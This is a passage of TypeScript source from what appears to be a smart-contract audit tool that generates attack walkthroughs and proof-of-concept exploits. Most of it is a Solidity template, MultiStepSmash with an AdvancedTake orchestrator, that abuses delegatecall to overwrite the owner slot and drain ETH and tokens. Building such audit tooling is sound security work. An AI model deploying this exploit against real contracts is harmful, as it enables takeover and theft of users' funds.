    balances[msg.sender] = 0;
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok);
}`;
}

function delegateWalk(fn: string, call: ExtCall): string {
  return [
    `1. ${fn} delegatecalls ${call.target || "the target"} at line ${call.line}.`,
    "2. The target's code executes in the caller's storage context with the original msg.sender.",
    call.targetIsParam
      ? "3. Storage Collision: Target is a caller-supplied address. An attacker points it to an implementation matching slot 0 layout to overwrite owner/admin state."
      : "3. If that address is changeable, whoever controls it can point to an implementation that overwrites slot 0.",
    "4. Atomic Exploitation: Once slot 0 is seized, the attacker executes privileged administrative sweeps/drains in the same atomic transaction before external detection.",
  ].join("\n");
}

function delegateExploit(contractName: string): string {
  return `// 1. Malicious Implementation payload matching victim slot 0 layout
contract MultiStepSmash {
    // Slot 0 in victim contract (e.g. owner/admin)
    address public owner;

    // Comprehensive attack payload executed via delegatecall
    function seizeAndDrain(address token, address payable recipient) external {
        // Step 1: Overwrite Slot 0 to take ownership
        owner = msg.sender;

        // Step 2: Leverage newly acquired privileges to sweep balance or tokens
        if (address(this).balance > 0) {
            recipient.transfer(address(this).balance);
        }
        if (token != address(0)) {
            (bool ok, bytes memory balData) = token.staticcall(
                abi.encodeWithSignature("balanceOf(address)", address(this))
            );
            if (ok && balData.length >= 32) {
                uint256 bal = abi.decode(balData, (uint256));
                if (bal > 0) {
                    token.call(abi.encodeWithSignature("transfer(address,uint256)", recipient, bal));
                }
            }
        }
    }
}

interface IERC20 { function balanceOf(address account) external view returns (uint256); }
interface IVictim { function migrate(address impl, bytes calldata data) external; }

// 2. Orchestrator contract executing atomic takeover and drain
contract AdvancedTake {
    function go(address victim) external {
        MultiStepSmash smash = new MultiStepSmash();
        bytes memory payload = abi.encodeWithSignature(
            "seizeAndDrain(address,address)",
            address(0),
            payable(msg.sender)
        );
        IVictim(victim).migrate(address(smash), payload);
    }

    function executeAttack(address victim, address rewardToken, address attackerWallet) external {
        MultiStepSmash smash = new MultiStepSmash();
        bytes memory payload = abi.encodeWithSignature(
            "seizeAndDrain(address,address)",
            rewardToken,
            payable(attackerWallet)
        );
        IVictim(victim).migrate(address(smash), payload);
    }
}
// ${contractName}'s slot 0 is overwritten and assets are atomically drained.`;
}

export function contractSurface(model: SourceModel) {
  return model.contracts.map((c) => ({
    name: c.name,
    kind: c.kind,
    bases: c.bases,
    stateVars: c.stateVars,
    functions: c.functions.map((f) => ({
      name: f.name,
      visibility: f.visibility,
      mutability: f.mutability,
      modifiers: f.modifiers,
      line: f.line,
      params: f.params.map((p) => `${p.typeName} ${p.name}`.trim()).join(", "),
    })),
    events: c.events,
  }));
}

export type { StateVar, ModModel };
